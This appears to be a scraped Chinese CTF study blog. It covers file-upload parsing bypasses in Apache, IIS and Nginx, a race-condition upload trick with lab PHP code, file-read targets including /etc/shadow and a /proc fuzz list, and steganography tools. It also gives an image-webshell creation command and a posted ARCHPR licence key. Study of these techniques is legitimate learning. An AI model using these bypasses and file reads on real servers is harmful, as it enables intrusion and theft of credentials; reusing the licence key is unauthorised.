<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.从右向左解析</span><br><span class="line">一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。</span><br><span class="line">可将文件名设为shell.php.7z</span><br><span class="line">或者&quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;,  &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,&quot;.tiff&quot;);</span><br><span class="line"></span><br><span class="line">2.00截断</span><br><span class="line">CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\x0A，如上传a.php，然后在burp中修改文件名为a.php\x0A)，以此来绕过一些黑名单过滤。</span><br></pre></td></tr></table></figure>

<h3 id="IIS-解析漏洞（少）"><a href="#IIS-解析漏洞（少）" class="headerlink" title="IIS 解析漏洞（少）"></a>IIS 解析漏洞（少）</h3><p>![image-20200728221508691](5 文件上传/image-20200728221508691.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0在解析asp格式的时候有两个解析漏洞，</span><br><span class="line">目录解析漏洞</span><br><span class="line">一个是如果目录名包含&quot;.asp&quot;字符串，那么这个目录下所有的文件都会按照asp去解析，</span><br><span class="line">文件解析漏洞（分号漏洞）</span><br><span class="line">另一个是只要文件名中含有&quot;.asp;1.jpg&quot;会优先按asp来解析</span><br><span class="line"></span><br><span class="line">IIS7.0&#x2F;7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串&quot;&#x2F;任意文件名.php&quot;就会按照php的方式去解析；</span><br></pre></td></tr></table></figure>

<h3 id="Nginx-解析漏洞（少）"><a href="#Nginx-解析漏洞（少）" class="headerlink" title="Nginx 解析漏洞（少）"></a>Nginx 解析漏洞（少）</h3><p>![image-20200728221951608](5 文件上传/image-20200728221951608.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解析： (任意文件名)&#x2F;(任意文件名).php | (任意文件名)%00.php</span><br><span class="line"></span><br><span class="line">描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg&#x2F;x.php进行解析攻击。</span><br><span class="line"></span><br><span class="line">还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</span><br></pre></td></tr></table></figure>

<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;       突破点 先把文件上传进去</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">先前是</span><br><span class="line"><span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br></pre></td></tr></table></figure>

<p>![image-20200729193101429](5 文件上传/image-20200729193101429.png)</p>
<p>直接上传1.php木马 intruder之后然后在浏览器不断刷新</p>
<p>![image-20200729192710431](5 文件上传/image-20200729192710431.png)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/21/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="post-title-link" itemprop="url">文件读取</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-11-21 21:45:57 / 修改时间：22:01:38" itemprop="dateCreated datePublished" datetime="2019-11-21T21:45:57+08:00">2019-11-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p> 首选判断是文件读取还是文件包含，因为 file_get_content (“/etc/passwd”) 和 include (“/etc/passwd”) 黑盒来看的表现可能一样。而文件包含是可以 getshell 的，文件读取就只能读取文件。 可以通过尝试读取相对路径的脚本文件，比如 <code>/read.php?file=read.php</code> 的方式，如果可以读取到文件源码，说明是文件读取，如果不能读取到文件源码说明是文件包含。</p>
<p>服务器上有价值的文件主要可以分为 3 类。通用的系统 / 应用配置文件，个性化的文件以及 web 应用的源码文件。而想要读取到一个文件只需要知道这个文件的绝对路径或者相对路径就可以了。 </p>
<p>把 web 应用的源码单独出来是觉得应用源码可以很方便的通过相对路径获取到，不需要费劲得到源码的绝对路径。系统的通用配置文件比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0   ip地址</span><br><span class="line">&#x2F;etc&#x2F;hosts                                  通常配置了一些内网域名</span><br></pre></td></tr></table></figure>

<p>等等可以通过字典的方式来猜解。</p>
<p>这个案例通过 passwd 中获得的用户来获取到了这个用户的 bash_history，从 bash_history 获取到了一些压缩包的地址。从而读取到了个性化的文件，一些压缩包的文件。<br><a href="http://xdxd.love/images/wenjianduqu2.png" target="_blank" rel="noopener"><img src="http://xdxd.love/images/wenjianduqu2.png" alt="img"></a><br><a href="http://xdxd.love/images/wenjianduqu3.png" target="_blank" rel="noopener"><img src="http://xdxd.love/images/wenjianduqu3.png" alt="img"></a></p>
<p>通过 mysql 的配置文件得知了数据的存储目录。通过直接读取数据库文件可以获取到数据库内的信息。</p>
<p><a href="http://xdxd.love/images/wenjianduqu4.png" target="_blank" rel="noopener"><img src="http://xdxd.love/images/wenjianduqu4.png" alt="img"></a></p>
<p>在说到文件包含利用的时候，会讲到有个小技巧，某些情况下可以包含 proc 下的文件。文件读取的情况下当然可以可以读取 proc 目录下的文件来获得更多系统的信息。</p>
<p><a href="http://xdxd.love/images/wenjianduqu5.png" target="_blank" rel="noopener"><img src="http://xdxd.love/images/wenjianduqu5.png" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sched_debug  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</span><br><span class="line">&#x2F;proc&#x2F;mounts 挂载的文件系统列表</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp  arp表，可以获得内网其他机器的地址</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route 路由表信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;tcp and &#x2F;proc&#x2F;net&#x2F;udp  活动连接的信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie 路由缓存</span><br><span class="line">&#x2F;proc&#x2F;version  内核版本</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cmdline 可能包含有用的路径信息</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;environ 程序运行的环境变量信息，可以用来包含getshell</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cwd     当前进程的工作目录</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;[#]  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span><br></pre></td></tr></table></figure>

<p>fuzz 字典：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;stat</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;status</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;environ</span><br><span class="line">&#x2F;proc&#x2F;verison</span><br><span class="line">&#x2F;proc&#x2F;cmdline</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;cwd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;0</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;1</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;2</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;4</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;5</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;6</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;7</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;8</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;9</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;11</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;12</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;13</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;14</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;15</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;16</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;17</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;18</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;19</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;20</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;21</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;22</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;23</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;24</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;25</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;26</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;27</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;28</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;29</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;30</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;31</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;32</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;33</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;34</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;35</span><br><span class="line">&#x2F;proc&#x2F;sched_debug</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;tcp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;udp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie</span><br><span class="line">&#x2F;proc&#x2F;version</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/%E9%9A%90%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/21/%E9%9A%90%E5%86%99/" class="post-title-link" itemprop="url">隐写</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-21 20:20:16" itemprop="dateCreated datePublished" datetime="2019-11-21T20:20:16+08:00">2019-11-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-29 18:50:40" itemprop="dateModified" datetime="2021-12-29T18:50:40+08:00">2021-12-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>winhex去看和binwalk</p>
<p>文件属性里面最多是提示信息和解密秘钥所在</p>
<p>strings  -o  flag.xls | grep zjctf<br>dd if=1.jpg of=2.rar skip=6391983 bs=1<br>binwalk -e<br>binwalk  -D:jpeg(txt)  a.jpg -M(递归)<br>data:image/jpg;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAACACAYAAABdhGZrAAAA<br>                      iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAYAAAB12js8AAAAAXN<br>比较两张图片：compare 1.jpg 2.jpg  diff.jpg<br>              cmp -l 1.jpg 2.jpg</p>
<p>制作图片马<br> <code>copy 1.jpg /b + shell.php /a shell.jpg</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">silenteye</span><br><span class="line"><span class="comment"># chr(i)返回ASCII码中整数对应的单个字符串</span></span><br><span class="line"><span class="comment"># binascii.a2b_hex 十六进制数字字符串转换为二进制数据</span></span><br><span class="line">a = <span class="string">b'worker'</span></span><br><span class="line"><span class="comment">#先把worker转换成二进制数据然后在用十六进制表示</span></span><br></pre></td></tr></table></figure>

<h4 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h4><blockquote>
<p> <strong><em>tshark -r x.pcapng -e http.request.uri -T fields -Y ‘http.request.uri’ | grep -P ‘name=[A-F0-9]{3}’ | awk -F ‘=’ ‘{printf $2}’</em></strong> </p>
</blockquote>
<h4 id="zsteg-png和bmp"><a href="#zsteg-png和bmp" class="headerlink" title="zsteg  png和bmp"></a>zsteg  png和bmp</h4><p>zsteg是一个可以检测png和bmp文件中隐藏数据的工具。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看lsb数据</span><br><span class="line">zsteg xxx.bmp</span><br><span class="line">zsteg xxx.png</span><br><span class="line">检测zlib</span><br><span class="line">#-b的位数是从1开始的</span><br><span class="line">zsteg zlib.bmp -b 1 -o xy -v</span><br><span class="line">提取该通道图片</span><br><span class="line">zsteg -e b8,a,lsb,xy 文件.png -&gt; out.png</span><br></pre></td></tr></table></figure>

<p>zsteg -a file ：运行给定文件上的所有方法    #查看各个通道的lsb</p>
<p>zsteg -E file ：从给定的有效负载中提取数据（例如：zsteg -E b4，bgr，msb，xy name.png）</p>
<ul>
<li><strong>PNG &amp; BMP</strong> 中的 LSB</li>
<li>zlib 压缩数据</li>
<li><a href="http://openstego.sourceforge.net/" target="_blank" rel="noopener">OpenStego</a></li>
<li><a href="http://camouflage.unfiction.com/" target="_blank" rel="noopener">伪装 1.2.1 版</a></li>
<li>带 Eratosthenes set 的 <a href="http://wiki.cedricbonhomme.org/security%3Asteganography" target="_blank" rel="noopener">LSB。</a></li>
</ul>
<h4 id="Wavsteg"><a href="#Wavsteg" class="headerlink" title="Wavsteg"></a>Wavsteg</h4><p>WavSteg是一个python3工具，可以隐藏wav文件中的数据和文件，也可以从wav文件中提取数据。</p>
<p>你可以从<a href="https://github.com/ragibson/Steganography#WavSteg" target="_blank" rel="noopener">github</a>得到它</p>
<p>有用的命令：</p>
<p><code>python3 WavSteg.py -r -s soundfile -o outputfile</code> ：从wav声音文件中提取数据并将数据输出到新文件中</p>
<h4 id="声波可视化器"><a href="#声波可视化器" class="headerlink" title="声波可视化器"></a>声波可视化器</h4><p>声波可视化工具是一种用于查看和分析音频文件内容的工具，但在处理音频隐写时它会很有用。您可以在音频文件中显示隐藏的形状。</p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723133826028.png" alt="image-20200723133826028"></p>
<p><a href="https://www.sonicvisualiser.org/" target="_blank" rel="noopener">官方网站</a></p>
<h4 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h4><p>使用ImageMagic中的convert工具，将图片进行重合覆盖。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sec@sec-pc:~/1$ convert image???.jpg -background none -compose lighten -flatten output.jpg</span><br></pre></td></tr></table></figure>

<p>首先在给出的base64编码前加上data:image/jpeg;base64,/9j/</p>
<p>然后base64转图片</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">echo aGVsbG8gd29ybGQh | base64 -D</span><br><span class="line"></span><br><span class="line">使用xxd将文本从ASCII转换为16进制编码的例子：</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> hello world\! | xxd -p</span></span><br><span class="line"></span><br><span class="line">搜索PNG文件中PNG魔法字节的例子</span><br><span class="line"><span class="meta">$</span><span class="bash"> bgrep 89504e47 screenshot.png</span></span><br><span class="line">screenshot.png: 00000000</span><br><span class="line"></span><br><span class="line">使用hexdump的例子：</span><br><span class="line"><span class="meta">$</span><span class="bash"> hexdump -C screenshot.png | less</span></span><br><span class="line"></span><br><span class="line">使用hexdump格式化命令以64字节整数的16进制来输出文件前50个字节例子如下：</span><br><span class="line"><span class="meta">$</span><span class="bash"> hexdump -n 50 -e <span class="string">'"0x%08x "'</span> screenshot.png</span></span><br><span class="line"></span><br><span class="line">下载ARCHPR http://www.xue51.com/soft/4104.html</span><br><span class="line">注册码：ARCHPRP-GSVMT-66892-GKVMB-52992</span><br></pre></td></tr></table></figure>

<h2 id="JPEG-jpg-，文件头：FFD8FFE0-00-10-4A-46-49-46"><a href="#JPEG-jpg-，文件头：FFD8FFE0-00-10-4A-46-49-46" class="headerlink" title="JPEG (jpg)，文件头：FFD8FFE0 00 10 4A 46 49 46"></a>JPEG (jpg)，文件头：FFD8FFE0 00 10 4A 46 49 46</h2><p>​                    FFC0<br>​                    文件的结尾FFD9<br>​                    <del>【LSB隐写】</del></p>
<p>​                    【steghide隐写 kali steghide检测算法隐写 1.Kai里安装 sudo apt-get install steghide】 steghide extract -sf rose.jpg</p>
<p>空密码</p>
<p>​                    【outguess】</p>
<p>​                    【F5】</p>
<p>​                    【stegdetect】检查隐写算法的可能性 outguess F5 jphide<br>​                    【Stegsolve】</p>
<p>1.图片属性 </p>
<p>2.strings </p>
<p>3.010Editor分析，未发现额外的数据 </p>
<p>4.StegSolve，未发现LSB等信息 </p>
<p>5.StegDetect，未发现隐写方法。    </p>
<h2 id="GIF-gif-，文件头：-3961"><a href="#GIF-gif-，文件头：-3961" class="headerlink" title="GIF (gif)，文件头： 3961"></a>GIF (gif)，文件头： 3961</h2><p>​                            GIF89a/87a<br>​        结束：0101003B</p>
<h2 id="PNG-png-，文件头：89504E47"><a href="#PNG-png-，文件头：89504E47" class="headerlink" title="PNG (png)，文件头：89504E47"></a>PNG (png)，文件头：89504E47</h2><p>​        89504E47 0D0A1A0A0000000D 49484452 0000014B 0000012C<br>​        00 00 00 0D 说明IHDR头块长为13<br>​        49 48 44 52 IHDR 标识<br>​        00 00 01 F4 图像的宽，500像素<br>​        00 00 01 A4 图像的高，420像素<br>​        最后四位CB　D6  DF  8A为CRC校验<br>找表示宽度和高度的位置的话，可以先看看图片的属性，得到宽高值，转成16进制，搜索16进制值就找到了<br>​        注：png图片的保存恢复效果比较好，jpg貌似有点问题<br>​        png图片像    数保存是从左到右，从下往上排列的。<br>​        图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
<p>​        如果我们仔细观察PNG文件，我们会发现，文 件的结尾12个字符看起来总应该是这样的：<br>​        00 00 00 00 49 45 4E 44 <strong>AE 42 60 82</strong><br>​        0000000049454E44AE426082<br>​        不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。<br>​    16进制的78 9C开头的，百度一下分析是zlib压缩的标志<br>​    【】stegsolve  【LSB隐写】 零通道有异样 上面有一行人为加上去的东西</p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723104356505.png" alt="image-20200723104356505"></p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723084719301.png" alt="image-20200723084719301"></p>
<p>​    【】binwalk foremost    </p>
<p>​    【】png图片 【LSB隐写】  cloacked-pixel工具（下载<a href="https://github.com/cyberinc/cloacked-pixel）" target="_blank" rel="noopener">https://github.com/cyberinc/cloacked-pixel）</a><br>​    cloacked-pixel在加密的过程中会删除其他数据块，只保留关键数据块IDAT<br>​    加密：python lsb.py hide big.png 1.txt 123456<br>​    hide：表示加密模式 big.png：待加密的png图片<br>​    1.txt：存放payload<br>​    123456：加密的密码<br>​    运行后生成图片big.png-stego.png<br>​    解密：python lsb.py extract big.png-stego.png 3.txt 123456<br>​    extract：表示解密模式 big.png-stego.png：待解密的png图片<br>​    3.txt：存放导出的payload<br>​    123456：解密密码<br>​    【】png图片【LSB隐写】LSB-Steganography工具<br>​    <a href="https://github.com/RobinDavid/LSB-Steganography" target="_blank" rel="noopener">https://github.com/RobinDavid/LSB-Steganography</a><br>​    加密：python LSBSteg.py -image original.png -binary original.bin -steg-out steg.png<br>​    解密：python LSBSteg.py -steg-image steg.png -out bin</p>
<p>：python lsb.py analyse big.png-stego.png</p>
<p>参数说明：</p>
<p>analyse：表示分析模式big.png-stego.png ：待分析的png图片 运行后会对图像进行分析，将其分割成块，标记每个块的最低有效位</p>
<p>crc曲线</p>
<p>下载后发现是png，打开看一下，图片模糊了。<strong>然后用hxd打开，选中开头IHDR，然后分析出crc32，发现crc32和它的crc32不同，长宽可能不正确。</strong></p>
<p><strong>用python来计算正确的长和高，以下代码基于python3，能自动算出高的问题，或者宽的问题。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import struct</span><br><span class="line">import 